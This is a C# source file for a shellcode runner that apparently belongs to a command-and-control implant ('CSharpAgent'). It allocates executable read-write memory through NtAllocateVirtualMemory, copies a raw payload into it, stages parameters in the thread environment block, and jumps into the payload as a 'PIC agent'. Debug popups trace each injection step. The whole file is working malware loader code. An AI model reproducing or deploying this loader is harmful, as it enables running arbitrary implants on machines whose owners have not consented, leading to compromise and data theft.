using System;
using System.Runtime.InteropServices;

namespace CSharpAgent
{
    internal static class ShellcodeRunner
    {
        internal static void RunPayload(byte[] bytes)
        {
            // DIAGNOSTIC popups on every inject step ([inj n]): a native crash in the stub
            // walk or the payload kills the process WITHOUT unwinding — no managed catch, no
            // [exit] popup — so the LAST caption a vanished run showed names the exact killer.
            // Addresses print as hex (Diag.Hex); the NtAllocateVirtualMemory NTSTATUS is now
            // captured and shown instead of silently discarded.

            // Detect native ARM64 at runtime so the correct execution stub is selected. IntPtr.Size
            // alone can't separate ARM64 from x64 (both 8), so we also check the system arch.

            NtdllApi ntdll;
            if(!NtdllApi.TryCreateNtdll(out ntdll))
                throw new InvalidOperationException("Failed to create Ntdll instance");

            Kernel32 k32;
            if(!Kernel32.TryCreateKernel32(out k32))
                throw new InvalidOperationException("Failed to create Kernel32 instance");

            SYSTEM_INFO sysInfo = new SYSTEM_INFO();
            k32.GetNativeSystemInfo(ref sysInfo);
            bool isArm64 = sysInfo.wProcessorArchitecture == 12 && IntPtr.Size == 8;
            IntPtr tebAddress = PebWalker.GetTebAddress();
          
#if DEBUG
            Diag.Show("[inj 1] arch", (isArm64 ? "ARM64" : IntPtr.Size == 8 ? "x86_64" : "i386") +
                " — TEB stub "+ IntPtr.Size + " bytes, " + bytes.Length + " payload bytes");
#endif
            IntPtr pMemory = IntPtr.Zero;
            UIntPtr regionSize = (UIntPtr)bytes.Length;

#if DEBUG
            Diag.Show("[inj 5] alloc", "NtAllocateVirtualMemory — commit+reserve " + bytes.Length + " bytes RWX");
#endif
            var nt = ntdll.NtAllocateVirtualMemory(
                new IntPtr(-1),
                ref pMemory,
                IntPtr.Zero,
                ref regionSize,
                0x1000 | 0x2000,
                0x40
            );
#if DEBUG
            Diag.Show("[inj 6] alloc result", "NTSTATUS 0x" + ((uint)nt).ToString("X8") +
                " — base " + Diag.Hex(pMemory) + ", region " + regionSize.ToUInt64() + " bytes");
#endif
            if (pMemory == IntPtr.Zero)
                throw new InvalidOperationException("NtAllocateVirtualMemory failed — NTSTATUS 0x" + ((uint)nt).ToString("X8"));

            Marshal.Copy(bytes, 0, pMemory, bytes.Length);

            if (isArm64)
               NativeImports.FlushInstructionCache(new IntPtr(-1), pMemory, (UIntPtr)bytes.Length);

            IntPtr parametersMemory = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(Parameters)));
            Parameters parameters = new Parameters
            {
                InjectorVersion = uint.MaxValue,
                InjectorCompilationType = 100
            };
            Marshal.StructureToPtr(parameters, parametersMemory, false);

            int offset = (IntPtr.Size == 8) ? 0x50 : 0x28;
            Marshal.WriteIntPtr(tebAddress, offset, parametersMemory);
#if DEBUG
            Diag.Show("[inj 7] staged", "payload copied, parameters written to TEB+" +
                offset.ToString("X") + " (" + Diag.Hex(parametersMemory) + ") — handoff ready");
#endif

            var entry = (EntryDelegate)Marshal.GetDelegateForFunctionPointer(pMemory, typeof(EntryDelegate));
#if DEBUG
            Diag.Show("[inj 8] entry", "CALLING the PIC agent at " + Diag.Hex(pMemory) +
                " — this thread is the WS agent's from now on; if the process VANISHES after " +
                "this line, the payload crashed natively (no managed catch can fire)");
#endif
            entry(uint.MaxValue);
#if DEBUG
            Diag.Show("[inj 9] entry RETURNED", "unexpected — the PIC agent returned immediately " +
                "(early bail on this box?); the reply reports status 0 anyway");
#endif
            Marshal.FreeHGlobal(parametersMemory);
        }

        internal static IntPtr IntPtrAdd(IntPtr p0, int p1)
        {
            return new IntPtr((IntPtr.Size == 8 ? p0.ToInt64() : p0.ToInt32()) + p1);
        }
    }
}
